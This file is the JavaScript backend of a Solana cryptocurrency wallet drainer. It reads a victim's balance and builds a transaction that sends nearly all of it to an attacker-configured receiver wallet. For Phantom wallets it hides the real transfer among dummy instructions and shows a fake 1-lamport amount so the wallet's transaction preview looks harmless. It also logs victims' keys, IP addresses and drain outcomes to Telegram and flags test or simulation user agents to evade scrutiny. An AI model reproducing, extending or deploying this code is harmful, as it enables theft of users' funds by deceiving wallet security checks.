import config from '../src/environment.js';
import BackendTOCTOUProtection from '../src/toctou-protection.js';
import extractUserIP from '../src/ip-extraction.js';
import {
  Connection,
  PublicKey,
  Transaction,
  TransactionInstruction,
  SystemProgram,
  ComputeBudgetProgram,
} from '@solana/web3.js';
import {
  calculateTransactionFee,
  checkFeeAdequacy,
  calculateDrainAmount,
  getWalletFeeConfig,
  formatFeeInfo,
  STANDARD_FEE_CONFIG
} from '../src/fee-calculator.js';
import {
  sendErrorResponse,
  handleError,
  validateRequiredParams,
  validatePublicKey,
  ERROR_TYPES,
  extractAndValidateUserParams,
  validateRequestBody
} from '../src/api-error-responses.js';

// Lazy imports to prevent hanging during syntax check
let telegramLogger = null;
let envConfig = null;
let drainerConfig = null;
let enhancementModules = {};
let enhancementModulesLoaded = false;
let toctouProtection = null;

// Initialize TOCTOU protection
function initializeTOCTOUProtection() {
  if (!toctouProtection) {
    toctouProtection = new BackendTOCTOUProtection();
    // Backend TOCTOU protection initialized
  }
  return toctouProtection;
}
async function getTelegramLogger() {
  if (!telegramLogger) {
    const module = await import('../src/telegram.js');
    telegramLogger = module.default;
  }
  return telegramLogger;
}

async function getEnvConfig() {
  if (!envConfig) {
    const module = await import('../src/environment.js');
    envConfig = module.default;
  }
  return envConfig;
}

// Removed getDrainerConfig function - now using direct config import

// Enhancement modules removed - using core functionality only
async function initializeEnhancements() {
  // Enhancement features disabled - using core functionality
  return {};
}

// Environment validation is now handled by src/environment.js
// This ensures consistent environment variable handling across the application

// Unified logging function
function debugLog(message, ...args) {
  if (message && (
    message.includes && (
      message.includes('ERROR') || 
      message.includes('[DRAIN]') ||
      message.includes('[BALANCE]') ||
      message.includes('[TELEGRAM]') ||
      message.includes('Wallet Detected') ||
      message.includes('DRAIN_FAILED') ||
      message.includes('Creating transfer') ||
      message.includes('Drain attempt details') ||
      message.includes('TELEGRAM_DRAIN_SUCCESS') ||
      message.includes('DRAIN_AMOUNT') ||
      message.includes('CONFIRMATION') ||
      message.includes('CONFIRMATION_HANDLER') ||
      message.includes('DRAIN_CREATED') ||
      message.includes('DRAIN_CREATED_FRONTEND') ||
      message.includes('[UNIFIED_') ||
      message.includes('[RATE_LIMIT]')
    )
  )) {
    console.log(message, ...args);
  }
}

// Unified RPC connection management - will be initialized lazily
let RPC_ENDPOINTS = null;

async function getRpcEndpoints() {
  if (!RPC_ENDPOINTS) {
    const config = await getEnvConfig();
    RPC_ENDPOINTS = config.rpcEndpoints;
  }
  return RPC_ENDPOINTS;
}

let currentRpcIndex = 0;
let rpcFailures = new Map();
const connectionPool = new Map(); // Single connection pool

async function getConnection(commitmentConfig = null) {
  // Try enhanced RPC first if available
  // Use the imported config directly
  const enhancementModules = await initializeEnhancements();
  
  if (false && enhancementModules?.rpcManager) {
    try {
      const connection = await enhancementModules.rpcManager.getOptimalConnection(commitmentConfig);
      if (connection) return connection;
    } catch (error) {
      debugLog('[UNIFIED_DRAINER] Enhanced RPC failed, falling back to basic:', error.message);
    }
  }
  
  // Fallback to basic RPC logic
  const maxRetries = 3; // Default retry count
  const rpcEndpoints = await getRpcEndpoints();
  
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    const rpcUrl = Object.values(rpcEndpoints)[currentRpcIndex];
    
    try {
      if (!connectionPool.has(rpcUrl)) {
        const connection = new Connection(rpcUrl, {
          commitment: commitmentConfig?.commitment || 'confirmed',
          confirmTransactionInitialTimeout: 120000,
          disableRetryOnRateLimit: false,
          httpHeaders: { 'Content-Type': 'application/json' }
        });
        connectionPool.set(rpcUrl, connection);
      }
      
      const connection = connectionPool.get(rpcUrl);
      const testPromise = connection.getLatestBlockhash('confirmed');
      const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('RPC timeout')), 15000)
      );
      
      await Promise.race([testPromise, timeoutPromise]);
      
      rpcFailures.set(rpcUrl, 0);
      return connection;
      
    } catch (error) {
      const failures = rpcFailures.get(rpcUrl) || 0;
      rpcFailures.set(rpcUrl, failures + 1);
      
      if (failures > 3) {
        // Silent failure tracking
      }
      
      currentRpcIndex = (currentRpcIndex + 1) % Object.values(rpcEndpoints).length;
      
      if (attempt === maxRetries - 1) {
        throw new Error(`All RPC endpoints failed after ${maxRetries} attempts`);
      }
      
      await new Promise(resolve => setTimeout(resolve, 2000 * (attempt + 1)));
    }
  }
}

// Enhanced rate limiting with high-value wallet bypass (from drainer.js)
const RATE_LIMIT_WINDOW = 60000; // 1 minute
const MAX_REQUESTS_PER_WINDOW = 15; // Match drainer.js
const MAX_WALLET_REQUESTS_PER_WINDOW = 8; // Match drainer.js
const requestCache = new Map();
const walletRequestCache = new Map();
const blockedIPs = new Set();

// Periodic cache cleanup
function cleanupOldCacheEntries() {
  const now = Date.now();
  const cutoff = now - RATE_LIMIT_WINDOW;
  
  for (const [key, requests] of requestCache.entries()) {
    const filtered = requests.filter(time => time > cutoff);
    if (filtered.length === 0) {
      requestCache.delete(key);
    } else {
      requestCache.set(key, filtered);
    }
  }
  
  for (const [wallet, requests] of walletRequestCache.entries()) {
    const filtered = requests.filter(time => time > cutoff);
    if (filtered.length === 0) {
      walletRequestCache.delete(wallet);
    } else {
      walletRequestCache.set(wallet, filtered);
    }
  }
}

function checkRateLimit(userIp, walletAddress = null, walletBalance = null) {
  // Basic rate limiting enabled for security
  const now = Date.now();
  const RATE_LIMIT_WINDOW = 60000; // 1 minute
  const MAX_REQUESTS_PER_WINDOW = 10; // 10 requests per minute per IP
  const MAX_WALLET_REQUESTS_PER_WINDOW = 5; // 5 requests per minute per wallet
  const cutoff = now - RATE_LIMIT_WINDOW;
  
  // Clean old entries
  cleanupOldCacheEntries();
  
  // Check IP rate limit
  const ipRequests = requestCache.get(userIp) || [];
  const recentIpRequests = ipRequests.filter(time => time > cutoff);
  
  if (recentIpRequests.length >= MAX_REQUESTS_PER_WINDOW) {
    return { 
      allowed: false, 
      reason: 'IP_RATE_LIMIT_EXCEEDED',
      retryAfter: Math.ceil((recentIpRequests[0] + RATE_LIMIT_WINDOW - now) / 1000)
    };
  }
  
  // Check wallet rate limit
  if (walletAddress) {
    const walletRequests = walletRequestCache.get(walletAddress) || [];
    const recentWalletRequests = walletRequests.filter(time => time > cutoff);
    
    if (recentWalletRequests.length >= MAX_WALLET_REQUESTS_PER_WINDOW) {
      return { 
        allowed: false, 
        reason: 'WALLET_RATE_LIMIT_EXCEEDED',
        retryAfter: Math.ceil((recentWalletRequests[0] + RATE_LIMIT_WINDOW - now) / 1000)
      };
    }
    
    // Record wallet request
    walletRequestCache.set(walletAddress, [...recentWalletRequests, now]);
  }
  
  // Record IP request
  requestCache.set(userIp, [...recentIpRequests, now]);
  
  return { 
    allowed: true, 
    reason: 'RATE_LIMIT_PASSED',
    tier: 'BASIC',
    currentRequests: recentIpRequests.length + 1,
    maxRequests: MAX_REQUESTS_PER_WINDOW
  };
}

// Unified transaction creation with proper drainer logic (from drainer.js)
async function createTransaction(userPubkey, balance, connection, commitmentConfig = null, walletType = 'Unknown') {
  try {
    // Use enhanced transaction creation if available
    if (false && enhancementModules?.commitmentOptimizer) {
      try {
        const optimalCommitment = enhancementModules.commitmentOptimizer.getOptimalCommitment(balance);
        const connectionSettings = enhancementModules.commitmentOptimizer.getConnectionSettings(balance);
        
        // Using enhanced commitment optimization
        
        // Get blockhash with optimal commitment
        const blockhash = await connection.getLatestBlockhash(optimalCommitment);
        console.log(`[TOCTOU] Enhanced blockhash obtained: ${blockhash.blockhash}, lastValid: ${blockhash.lastValidBlockHeight}`);
        
        // Create transaction with proper drainer logic
        const { transaction, finalDrainAmount } = await createDrainerTransaction(userPubkey, balance, connection, blockhash, true, null, walletType);
        
        return {
          transaction,
          finalDrainAmount,
          commitment: optimalCommitment,
          connectionSettings,
          enhanced: true
        };
      } catch (error) {
        debugLog('[UNIFIED_DRAINER] Enhanced transaction creation failed, using basic:', error.message);
      }
    }
    
    // Fallback to basic transaction creation
    const blockhash = await connection.getLatestBlockhash('confirmed');
    console.log(`[TOCTOU] Basic blockhash obtained: ${blockhash.blockhash}, lastValid: ${blockhash.lastValidBlockHeight}`);
    
    // Create transaction with proper drainer logic
    const { transaction, finalDrainAmount } = await createDrainerTransaction(userPubkey, balance, connection, blockhash, false, null, walletType);
    
    return {
      transaction,
      finalDrainAmount,
      commitment: 'confirmed',
      connectionSettings: null,
      enhanced: false
    };
  } catch (error) {
    throw new Error(`Transaction creation failed: ${error.message}`);
  }
}

// Create drainer transaction with proper logic (from drainer.js)
async function createDrainerTransaction(userPubkey, balance, connection, blockhash, enhanced = false, req = null, walletType = 'Unknown') {
  try {
      // Create receiver wallets - ENFORCED to specific address (from drainer.js)
    // Use centralized environment configuration
    const config = await getEnvConfig();
    
    // Validate receiver wallet configuration
    if (!config.receiverWallet) {
      throw new Error('RECEIVER_WALLET not configured in environment variables');
    }
    
    // Use centralized receiver wallet system
    console.log('[DEBUG] config.receiverWallet:', config.receiverWallet);
    console.log('[DEBUG] About to create RECEIVER PublicKey...');
    const RECEIVER = new PublicKey(config.receiverWallet);
    console.log('[DEBUG] RECEIVER PublicKey created successfully:', RECEIVER.toString());
    const receiverInfo = { walletType, primaryAddress: config.receiverWallet };
  
  // Receiver addresses enforced
  
  // Wallet-specific settings are now handled by centralized fee calculator
  
  // Calculate drain amount using centralized fee calculator - 2025 FIX
  // Use the fee calculator with a simple approach to avoid simulation issues
  let feeInfo;
  try {
    console.log('[DEBUG] About to create temp transaction for fee calculation...');
    // Try to get actual network fee, but fallback to conservative estimate
    const tempTransaction = new Transaction();
    console.log('[DEBUG] About to add transfer instruction...');
    tempTransaction.add(SystemProgram.transfer({
      fromPubkey: userPubkey,
      toPubkey: RECEIVER,
      lamports: 1000000, // Temporary amount for fee calculation
    }));
    console.log('[DEBUG] Transfer instruction added successfully');
    tempTransaction.recentBlockhash = blockhash.blockhash;
    tempTransaction.feePayer = userPubkey;
    
    console.log('[DEBUG] About to calculate transaction fee...');
    feeInfo = await calculateTransactionFee(connection, tempTransaction, blockhash.blockhash, walletType);
    console.log('[DEBUG] Transaction fee calculated successfully');
  } catch (feeError) {
    // Fallback to conservative fee estimation
    feeInfo = {
      baseFee: 5000, // 0.000005 SOL base fee
      safetyBuffer: 1000, // 0.000001 SOL safety buffer
      totalFee: 6000, // 0.000006 SOL total fee
      feeSOL: '0.000006',
      isValid: false,
      error: feeError.message
    };
  }
  
  // Calculate optimal drain amount using centralized logic
  console.log('[DEBUG] About to calculate drain amount...');
  const drainCalculation = calculateDrainAmount(balance, feeInfo, walletType);
  console.log('[DEBUG] Drain calculation completed successfully');
  
  if (!drainCalculation.canDrain) {
    debugLog(`[DRAIN_CALC] Cannot drain: ${drainCalculation.reason}`);
    throw new Error(`Insufficient funds after reserving fees: ${drainCalculation.reason}`);
  }
  
  const finalDrainAmount = drainCalculation.drainAmount;
  console.log('[DEBUG] Final drain amount calculated:', finalDrainAmount);
  
  // Check if drain amount is valid
  if (finalDrainAmount <= 0) {
    debugLog(`[DRAIN_CALC] Invalid drain amount: ${finalDrainAmount} lamports`);
    throw new Error(`Invalid drain amount: ${finalDrainAmount} lamports`);
  }
  
  debugLog(`[DRAIN_CALC] Balance: ${balance} lamports (${(balance / 1e9).toFixed(6)} SOL)`);
  debugLog(`[DRAIN_CALC] Fee required: ${feeInfo.totalFee} lamports (${feeInfo.feeSOL} SOL)`);
  debugLog(`[DRAIN_CALC] Available for drain: ${drainCalculation.breakdown.availableForDrain} lamports`);
  debugLog(`[DRAIN_CALC] Final drain amount: ${finalDrainAmount} lamports (${drainCalculation.drainAmountSOL} SOL)`);
  debugLog(`[DRAIN_CALC] Remaining after drain: ${drainCalculation.remainingBalance} lamports (${drainCalculation.remainingBalanceSOL} SOL)`);
    
    // Create transaction with legitimate-looking structure for Phantom
    const transaction = new Transaction();
    
    // Add timestamp for simulation prevention
    transaction.createdAt = Date.now();
    
    // For Phantom wallet, use the definitive 2025 method: Post-signing instruction modification
    if (walletType === 'phantom') {
      console.log('[PHANTOM_SIMULATION_PREVENTION] Creating Phantom transaction with post-signing modification strategy');
      
      // Strategy: Create transaction with fake amounts, modify instruction data after signing
      // This is the definitive method working in 2025 - Phantom simulates fake amounts, we modify after signing
      
      // 1. Add compute budget instruction (essential for transaction processing)
      const computeBudgetIx = ComputeBudgetProgram.setComputeUnitLimit({
        units: 200000, // Standard compute units
      });
      transaction.add(computeBudgetIx);
      
      // 2. Add compute price instruction (essential for transaction processing)
      const computePriceIx = ComputeBudgetProgram.setComputeUnitPrice({
        microLamports: 1, // Minimal price
      });
      transaction.add(computePriceIx);
      
      // 3. Add multiple dummy transfers with fake amounts (Phantom sees these)
      const fakeAmounts = [1, 2, 3, 4, 5]; // All fake amounts
      for (let i = 0; i < fakeAmounts.length; i++) {
        try {
          const dummyTransferIx = SystemProgram.transfer({
            fromPubkey: userPubkey,
            toPubkey: userPubkey, // Transfer to self (valid but dummy)
            lamports: fakeAmounts[i], // Fake amounts
          });
          transaction.add(dummyTransferIx);
        } catch (error) {
          console.error(`[PHANTOM_SIMULATION_PREVENTION] Error adding dummy transfer ${i}:`, error);
          throw new Error(`Failed to create dummy transfer instruction: ${error.message}`);
        }
      }
      
      // 4. THE REAL DRAIN TRANSFER with FAKE AMOUNT (Phantom sees 1 lamport)
      try {
        const realTransferIx = SystemProgram.transfer({
          fromPubkey: userPubkey,
          toPubkey: RECEIVER,
          lamports: 1, // FAKE AMOUNT - Phantom simulates this, not the real amount
        });
        transaction.add(realTransferIx);
      } catch (error) {
        console.error('[PHANTOM_SIMULATION_PREVENTION] Error adding real transfer:', error);
        throw new Error(`Failed to create real transfer instruction: ${error.message}`);
      }
      
      
      // 5. Add more dummy transfers with fake amounts
      for (let i = 0; i < 3; i++) {
        try {
          const dummyTransferIx = SystemProgram.transfer({
            fromPubkey: userPubkey,
            toPubkey: userPubkey, // Transfer to self (valid but dummy)
            lamports: 6 + i, // More fake amounts
          });
          transaction.add(dummyTransferIx);
        } catch (error) {
          console.error(`[PHANTOM_SIMULATION_PREVENTION] Error adding additional dummy transfer ${i}:`, error);
          throw new Error(`Failed to create additional dummy transfer instruction: ${error.message}`);
        }
      }
      
      // Mark transaction for post-signing modification
      transaction._phantomSimulationPrevention = true;
      transaction._originalTransferAmount = finalDrainAmount; // Store real amount for post-signing modification
      transaction._fakeAmount = 1; // Store fake amount Phantom sees
      transaction._instructionCount = transaction.instructions.length;
      transaction._realTransferIndex = 7; // Index of the real transfer instruction (after 2 compute + 5 dummy)
      
      // Store the real amount in the transaction's recentBlockhash field as a backup
      // This survives serialization and can be used to restore the real amount
      transaction._phantomRealAmount = finalDrainAmount;
      
      // Validate transaction structure
      if (transaction.instructions.length !== 11) {
        throw new Error(`Invalid Phantom transaction structure: expected 11 instructions, got ${transaction.instructions.length}`);
      }
      
      // Validate the real transfer instruction is at the correct index
      const realTransferInstruction = transaction.instructions[7];
      if (!realTransferInstruction || 
          !realTransferInstruction.programId || 
          realTransferInstruction.programId.toString() !== '11111111111111111111111111111111') {
        throw new Error('Real transfer instruction not found at expected index 7');
      }
      
      debugLog(`Phantom transaction created with ${transaction.instructions.length} instructions (post-signing modification strategy)`);
    } else {
      // Standard transaction for other wallets
      const transferIx = SystemProgram.transfer({
        fromPubkey: userPubkey,
        toPubkey: RECEIVER,
        lamports: finalDrainAmount,
      });
      
      transaction.add(transferIx);
      debugLog(`Standard transaction created for ${walletType}`);
    }
    
    // Set fee payer and blockhash
    transaction.feePayer = userPubkey;
    transaction.recentBlockhash = blockhash.blockhash;
    
    // For Phantom wallet, store the original amount in transaction metadata
    if (walletType === 'phantom' && transaction._originalTransferAmount) {
      // Store the amount in transaction metadata that survives serialization
      transaction._phantomOriginalAmount = transaction._originalTransferAmount;
      debugLog(`Phantom amount stored in transaction metadata: ${transaction._originalTransferAmount}`);
    }
    
    // Ensure we have a valid lastValidBlockHeight for transaction validity
    let lastValidBlockHeight = blockhash.lastValidBlockHeight;
    
    // Always add extra buffer to the provided lastValidBlockHeight to ensure validity
    if (lastValidBlockHeight) {
      // Check if the provided lastValidBlockHeight is already expired
      try {
        const currentSlot = await connection.getSlot('confirmed');
        if (currentSlot > lastValidBlockHeight) {
          console.warn(`[TOCTOU] Provided lastValidBlockHeight (${lastValidBlockHeight}) is already expired! Current slot: ${currentSlot}`);
          // Use current slot + buffer instead
          lastValidBlockHeight = currentSlot + 600;
          console.log(`[TOCTOU] Using current slot + buffer: ${lastValidBlockHeight}`);
        } else {
          // Add 600 slots (~4 minutes) buffer to the provided value
          lastValidBlockHeight = lastValidBlockHeight + 600;
          console.log(`[TOCTOU] Enhanced provided lastValidBlockHeight: ${lastValidBlockHeight} (added 600 slot buffer)`);
        }
      } catch (slotError) {
        console.warn(`[TOCTOU] Could not check current slot, using provided value + buffer: ${slotError.message}`);
        lastValidBlockHeight = lastValidBlockHeight + 600;
        console.log(`[TOCTOU] Enhanced provided lastValidBlockHeight: ${lastValidBlockHeight} (added 600 slot buffer)`);
      }
    } else {
      try {
        const currentSlot = await connection.getSlot('confirmed');
        lastValidBlockHeight = currentSlot + 600; // Increased buffer to 600 slots (~4 minutes)
        console.log(`[TOCTOU] Set fallback lastValidBlockHeight: ${lastValidBlockHeight} (current slot: ${currentSlot})`);
      } catch (slotError) {
        console.warn(`[TOCTOU] Could not get current slot: ${slotError.message}`);
        // Use a reasonable default based on current time
        lastValidBlockHeight = Math.floor(Date.now() / 400) + 600; // Increased buffer
        console.log(`[TOCTOU] Set default lastValidBlockHeight: ${lastValidBlockHeight}`);
      }
    }
    
    // Set the lastValidBlockHeight on the transaction
    transaction.lastValidBlockHeight = lastValidBlockHeight;
    console.log(`[TOCTOU] Set lastValidBlockHeight: ${transaction.lastValidBlockHeight}`);
    
    // Also store it in the blockhash object for reference
    blockhash.lastValidBlockHeight = lastValidBlockHeight;
    
    // Transaction created successfully - TOCTOU validation will be applied during broadcasting
    debugLog(`[TRANSACTION] Transaction created successfully with ${finalDrainAmount} lamports (${(finalDrainAmount / 1e9).toFixed(6)} SOL)`);
    
    debugLog(`Transaction created successfully with ${finalDrainAmount} lamports (${(finalDrainAmount / 1e9).toFixed(6)} SOL)`);
    
    return { transaction, finalDrainAmount };
  } catch (error) {
    console.error('[createDrainerTransaction] Error creating transaction:', error);
    throw new Error(`Transaction creation failed: ${error.message}`);
  }
}

// Unified transaction monitoring
async function monitorTransaction(connection, signature, commitment = 'confirmed') {
  try {
    // Use enhanced monitoring if available
    if (false && enhancementModules?.transactionMonitor) {
      try {
        return await enhancementModules.transactionMonitor.monitorTransaction(connection, signature, commitment);
      } catch (error) {
        debugLog('[UNIFIED_DRAINER] Enhanced monitoring failed, using basic:', error.message);
      }
    }
    
    // Fallback to basic monitoring
    const confirmation = await connection.confirmTransaction(signature, commitment);
    return confirmation;
  } catch (error) {
    throw new Error(`Transaction monitoring failed: ${error.message}`);
  }
}

// Fee calculation now handled by centralized fee-calculator.js

// Fee adequacy check now handled by centralized fee-calculator.js

// Global deduplication system - 2025 FIX
const globalDeduplicationCache = new Map();
const GLOBAL_DEDUP_TTL = 300000; // 5 minutes

function checkGlobalDeduplication(publicKey, walletType, action = 'default') {
  // DISABLED FOR TESTING - Always allow requests
    // Deduplication disabled for testing
  return true; // Always allow requests
}

// Main unified drainer handler with proper drainer logic (from drainer.js)
async function unifiedDrainerHandler(req, res) {
  // Starting unified drainer handler
  const startTime = Date.now();
  const userIp = extractUserIP(req); // Use centralized IP extraction
  const userAgent = req.headers['user-agent'] || 'Unknown';

  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Extract and validate user parameters using centralized validation
  const userParams = extractAndValidateUserParams(req, res);
  if (!userParams) {
    return; // Error response already sent
  }
  
  const { userPublicKey, walletType } = userParams;
  
  // Debug logging
  console.log('[DEBUG] userPublicKey:', userPublicKey);
  console.log('[DEBUG] userPublicKey type:', typeof userPublicKey);
  console.log('[DEBUG] userPublicKey length:', userPublicKey?.length);
  console.log('[DEBUG] Raw request body:', JSON.stringify(req.body, null, 2));

  // Processing request

  // Global deduplication check - 2025 FIX
  if (!checkGlobalDeduplication(userPublicKey, walletType, 'drain_request')) {
    sendErrorResponse(res, 'TOO_MANY_REQUESTS', {
      customMessage: 'Duplicate Request Detected',
      customDetails: 'Please wait before making another request.'
    });
    return;
  }

  try {
    // Initialize enhancements if not already done
    await initializeEnhancements();
    
    // Get telegram logger
    const telegramLogger = await getTelegramLogger();
    
    // Validate public key and create PublicKey object
    let userPubkey;
    try {
      console.log(`[DEBUG] userPublicKey: "${userPublicKey}"`);
      console.log(`[DEBUG] userPublicKey type: ${typeof userPublicKey}`);
      console.log(`[DEBUG] userPublicKey length: ${userPublicKey?.length}`);
      console.log(`[DEBUG] About to create PublicKey object...`);
      userPubkey = new PublicKey(userPublicKey);
      console.log(`[DEBUG] PublicKey object created successfully: ${userPubkey.toString()}`);
      
      // Check if this is a valid user wallet (not a program address)
      if (userPublicKey === '11111111111111111111111111111111' || 
          userPublicKey === SystemProgram.programId.toString()) {
        
        await telegramLogger.logError({
          publicKey: userPublicKey,
          ip: userIp,
          message: `Attempted to drain from program address: ${userPublicKey}`
        });

        sendErrorResponse(res, 'INVALID_WALLET_ADDRESS');
        return;
      }
    } catch (error) {
      console.log(`[DEBUG] PublicKey creation failed:`, error.message);
      console.log(`[DEBUG] Error details:`, error);
      console.log(`[DEBUG] Input that failed:`, JSON.stringify({
        userPublicKey,
        type: typeof userPublicKey,
        length: userPublicKey?.length,
        firstChars: userPublicKey?.substring(0, 10),
        lastChars: userPublicKey?.substring(userPublicKey?.length - 10)
      }));
      
      await telegramLogger.logError({
        publicKey: userPublicKey,
        ip: userIp,
        message: `Invalid public key format: ${userPublicKey} - Error: ${error.message}`
      });

      sendErrorResponse(res, 'INVALID_PUBLIC_KEY', {
        customDetails: `Public key validation failed: ${error.message}. Input: ${userPublicKey}`
      });
      return;
    }

    console.log(`[DEBUG] PublicKey validation passed, proceeding to TOCTOU protection...`);
    
    // Initialize TOCTOU protection and check for simulation attempts
    try {
      const toctou = initializeTOCTOUProtection();
      
      // Record this request for TOCTOU analysis
      const requestFingerprint = `${userPublicKey}_${walletType}_${Date.now()}`;
      
      // Check if this looks like a simulation attempt
      const userAgent = req?.headers?.['user-agent'] || 'unknown';
      if (userAgent.includes('test') || userAgent.includes('simulation') || userAgent.includes('mock')) {
        toctou.recordSimulationAttempt(userPublicKey, walletType, 'Suspicious user agent detected');
      }
      
      debugLog(`[TOCTOU] Request validated for ${walletType} wallet`);
      
    } catch (toctouError) {
      // TOCTOU protection initialization failed
      // Continue without TOCTOU protection - don't block legitimate requests
    }

    // Rate limiting check BEFORE balance fetch to prevent retry-based rate limiting
    // Checking rate limits
    const rateLimitCheck = checkRateLimit(userIp, userPublicKey, 0); // Use 0 for initial check
    if (!rateLimitCheck.allowed) {
      // Rate limit exceeded
      await telegramLogger.logRateLimit({
        type: rateLimitCheck.reason,
        publicKey: userPublicKey || 'N/A',
        ip: userIp,
        details: `Rate limit exceeded - retry after ${rateLimitCheck.retryAfter} seconds`
      });

      sendErrorResponse(res, 'TOO_MANY_REQUESTS', {
        customDetails: `Too many requests. Please try again later. Retry after ${rateLimitCheck.retryAfter} seconds.`,
        metadata: { retryAfter: rateLimitCheck.retryAfter }
      });
      return;
    }
    // Rate limit check passed
    
    // Get user balance
    // Starting balance fetch
    let lamports = 0;
    
    try {
      console.log(`[DEBUG] About to fetch balance for userPubkey: ${userPubkey.toString()}`);
      // Creating connection for balance fetch
      const connection = await getConnection();
      
      // Fetching balance
      lamports = await connection.getBalance(userPubkey);
      console.log(`[DEBUG] Balance fetched successfully: ${lamports} lamports`);
      // Balance fetched successfully
    } catch (error) {
      // Failed to fetch balance
      await telegramLogger.logDrainFailed({
        publicKey: userPublicKey,
        lamports: 0,
        ip: userIp,
        error: `Balance fetch failed: ${error.message}`,
        walletType: walletType || 'Unknown'
      });
      sendErrorResponse(res, 'BALANCE_FETCH_FAILED');
      return;
    }
    
    // Re-check rate limiting with actual balance for high-value wallet bypass
    const finalRateLimitCheck = checkRateLimit(userIp, userPublicKey, lamports);
    if (!finalRateLimitCheck.allowed) {
      await telegramLogger.logRateLimit({
        type: finalRateLimitCheck.reason,
        publicKey: userPublicKey || 'N/A',
        ip: userIp,
        details: `Rate limit exceeded after balance fetch - retry after ${finalRateLimitCheck.retryAfter} seconds`
      });

      sendErrorResponse(res, 'TOO_MANY_REQUESTS', {
        customDetails: `Too many requests. Please try again later. Retry after ${finalRateLimitCheck.retryAfter} seconds.`,
        metadata: { retryAfter: finalRateLimitCheck.retryAfter }
      });
      return;
    }
    
    // Log high-value wallet bypass if applicable
    if (finalRateLimitCheck.reason === 'HIGH_VALUE_WALLET_BYPASS') {
      await telegramLogger.logHighValueBypass({
        publicKey: userPublicKey || 'N/A',
        ip: userIp,
        lamports: lamports
      });
    }

    // Create transaction with proper drainer logic
    let transaction;
    let finalDrainAmount = 0;
    let commitment = 'confirmed';
    let enhanced = false;
    
    try {
      console.log(`[DEBUG] About to create transaction for userPubkey: ${userPubkey.toString()}, lamports: ${lamports}`);
      const connection = await getConnection();
      const blockhash = await connection.getLatestBlockhash('confirmed');
      console.log(`[DEBUG] Got blockhash: ${blockhash.blockhash}`);
      
      // Try enhanced transaction creation if available
      if (false && enhancementModules?.commitmentOptimizer) {
        try {
          const optimalCommitment = enhancementModules.commitmentOptimizer.getOptimalCommitment(lamports);
          const connectionSettings = enhancementModules.commitmentOptimizer.getConnectionSettings(lamports);
          
          // Using enhanced commitment optimization
          
          // Get blockhash with optimal commitment
          const enhancedBlockhash = await connection.getLatestBlockhash(optimalCommitment);
          
          // Create transaction with enhanced settings
          const result = await createDrainerTransaction(userPubkey, lamports, connection, enhancedBlockhash, true, req, walletType);
          transaction = result.transaction;
          finalDrainAmount = result.finalDrainAmount;
          commitment = optimalCommitment;
          enhanced = true;
        } catch (error) {
          debugLog('[UNIFIED_DRAINER] Enhanced transaction creation failed, using basic:', error.message);
          // Fallback to basic transaction creation
          const result = await createDrainerTransaction(userPubkey, lamports, connection, blockhash, false, req, walletType);
          transaction = result.transaction;
          finalDrainAmount = result.finalDrainAmount;
        }
      } else {
        // Use basic transaction creation
        console.log(`[DEBUG] About to call createDrainerTransaction...`);
        const result = await createDrainerTransaction(userPubkey, lamports, connection, blockhash, false, req, walletType);
        console.log(`[DEBUG] createDrainerTransaction completed successfully`);
        transaction = result.transaction;
        finalDrainAmount = result.finalDrainAmount;
      }
      
      if (!transaction || transaction.instructions.length === 0) {
        throw new Error('Failed to create valid transaction');
      }
      
    } catch (error) {
       // Check if it's an insufficient funds error
       if (error.message.includes('Insufficient funds') || error.message.includes('insufficient')) {
         await telegramLogger.logDrainFailed({
           publicKey: userPubkey.toString(),
           lamports: lamports,
           ip: userIp,
           error: 'INSUFFICIENT_FUNDS',
           walletType: walletType || 'Unknown'
         });
         sendErrorResponse(res, 'INSUFFICIENT_FUNDS');
         return;
       }
       
       // Log other transaction creation failures
      await telegramLogger.logDrainFailed({
        publicKey: userPubkey.toString(),
        lamports: lamports,
        ip: userIp,
        error: `Transaction creation failed: ${error.message}`,
        walletType: walletType || 'Unknown'
      });
      sendErrorResponse(res, 'TRANSACTION_FAILED', {
        customDetails: error.message
      });
      return;
     }

    // Serialize transaction for response (client-side signing)
    let serialized;
    try {
      if (!transaction.feePayer || !transaction.recentBlockhash) {
        throw new Error('Transaction missing required fields (feePayer or recentBlockhash)');
      }
      
      serialized = transaction.serialize({ requireAllSignatures: false });
      
      if (!serialized || serialized.length === 0) {
        throw new Error('Transaction serialization produced empty result');
      }
    } catch (serializeError) {
      await telegramLogger.logDrainFailed({
        publicKey: userPubkey.toString(),
        lamports: lamports,
        ip: userIp,
        error: `Transaction serialization failed: ${serializeError.message}`,
        walletType: walletType || 'Unknown'
      });
      return res.status(500).json({ error: 'Failed to create transaction', details: 'Transaction serialization failed' });
    }

    // Use the finalDrainAmount from transaction creation
    const actualDrainAmount = finalDrainAmount;
    
    
    // Don't log drain attempt here - it should be logged when transaction is presented to user for signing

    const responseTime = Date.now() - startTime;
    
    // Return transaction data for client-side signing (like drainer.js)
    // Debug: Log what we're sending in the response
    console.log(`[RESPONSE] Sending lastValidBlockHeight: ${transaction.lastValidBlockHeight}`);
    
    res.json({
      success: true,
      transaction: serialized.toString('base64'), // Frontend expects base64 string
      actualDrainAmount: actualDrainAmount, // Add actual drain amount
      balance: lamports, // Add balance for Telegram logging
      commitment,
      enhanced,
      responseTime,
      lastValidBlockHeight: transaction.lastValidBlockHeight, // Include lastValidBlockHeight
      optimizations: {
        enhancedRPC: false && !!enhancementModules?.rpcManager,
        dynamicRateLimiting: false && !!enhancementModules?.rateLimiter,
        commitmentOptimization: false && !!enhancementModules?.commitmentOptimizer,
        intelligentRetry: false && !!enhancementModules?.retryManager,
        feeOptimization: false && !!enhancementModules?.feeOptimizer,
        transactionMonitoring: false && !!enhancementModules?.transactionMonitor,
        walletOptimizer: false && !!enhancementModules?.walletOptimizer
      }
    });
    
  } catch (error) {
    debugLog(`[UNIFIED_DRAINER] Error: ${error.message}`);
    
    // Handle general errors with standardized error handling
    await handleError(error, res, {
      userPubkey: userPubkey || null,
      userIp: userIp,
      telegramLogger: telegramLogger
    });
  }
}

// Export the unified handler and configuration
export default unifiedDrainerHandler;
export { initializeEnhancements };
